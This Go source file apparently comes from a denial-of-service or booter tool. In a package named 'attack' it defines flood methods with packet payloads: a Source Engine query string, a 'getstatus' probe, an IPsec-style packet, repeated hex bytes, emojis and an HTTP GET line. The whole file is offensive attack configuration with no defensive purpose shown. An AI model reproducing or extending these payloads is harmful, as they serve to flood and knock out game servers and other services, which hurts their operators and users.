package attack

func VSE() *Method {
	return &Method{
		Payload:     "\\x54\\x53\\x6F\\x75\\x72\\x63\\x65\\x20\\x45\\x6E\\x67\\x69\\x6E\\x65\\x20\\x51\\x75\\x65\\x72\\x79",
		PayloadSize: 1,
		Name:        "VSE",
	}
}

func MOJI() *Method {
	return &Method{
		Payload:     "🥰😆",
		PayloadSize: 1250,
		Name:        "MOJI",
	}
}

func FMS() *Method {
	return &Method{
		Payload:     "\\x67\\x65\\x74\\x73\\x74\\x61\\x74\\x75\\x73",
		PayloadSize: 1,
		Name:        "FMS",
	}
}

func IPSEC() *Method {
	return &Method{
		Payload:     "\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01",
		PayloadSize: 1,
		Name:        "IPSEC",
	}
}

func HEX() *Method {
	return &Method{
		Payload:     "\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58\\x99\\x21\\x58",
		PayloadSize: 150,
		Name:        "HEX",
	}
}

func HTTP() *Method {
	return &Method{
		Payload:     "GET / HTTP/1.1\r\n",
		PayloadSize: 1,
		Name:        "HTTP",
	}
}
